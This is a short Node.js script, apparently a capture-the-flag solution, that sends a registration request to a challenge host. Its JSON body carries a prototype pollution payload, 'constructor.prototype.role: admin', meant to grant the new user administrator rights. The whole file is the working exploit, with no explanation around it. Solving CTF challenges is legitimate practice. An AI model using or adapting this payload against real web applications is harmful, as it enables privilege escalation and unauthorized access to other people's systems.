
const http = require('http');

const data = JSON.stringify({
  "username": "test",
  "constructor": {
    "prototype": {
      "role": "admin"
    }
  }
});

const options = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(data)
  }
};

const req = http.request(options, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log(body);
  });
});

req.on('error', err => console.error(err));
req.write(data);
req.end();
